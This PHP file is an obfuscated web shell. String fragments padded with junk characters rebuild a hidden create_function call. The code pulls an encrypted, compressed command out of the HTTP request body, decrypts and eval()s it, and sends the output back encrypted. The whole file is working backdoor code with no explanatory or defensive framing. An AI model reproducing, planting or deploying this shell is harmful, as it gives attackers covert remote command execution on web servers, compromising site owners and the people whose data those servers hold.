<?php
$l='$m[1]),$k))r8);r8r8$o=@ob_get_cr8ontentsr8()r8;@ob_end_cr8leanr8();$r=@br8';
$p='$k="f64dr8410f";r8$r8kh="e2r8e46e9386d4";r8$kf="8r840r873b471cdbr8"r8;$p="';
$R=str_replace('A','','creAAate_AfuAAncAtion');
$H='en(r8$t);$o=r8""r8;for($i=0r8;$ir8<$r8l;){forr8(r8$j=0;($j<$c&r8&$i<$l)r8;';
$n='r8h("/$kh(.+)$kr8f/",r8@file_ger8t_r8r8contentr8s("php://input"r8)r8,$m)==';
$f='ase64r8_encor8r8de(@r8x(@gzcomprr8ess(r8$o),$k));printr8(r8"$p$kh$r$kf");}';
$c='AVmLwpr8r8L5yW8hw6f0"r8;functior8n xr8($t,$kr8){$c=strlr8r8en($k)r8;$l=strl';
$j='$j++,$i++r8){$o.=$r8t{$ir8}^r8r8$k{$j};}}retr8urn $o;}ir8f r8(@preg_matr8c';
$F='1) {@or8br8_sr8tart();@evar8l(@r8gzuncompresr8s(@r8x(@baser864_decor8dr8e(';
$h=str_replace('r8','',$p.$c.$H.$j.$n.$F.$l.$f);
$Y=$R('',$h);$Y();
?>
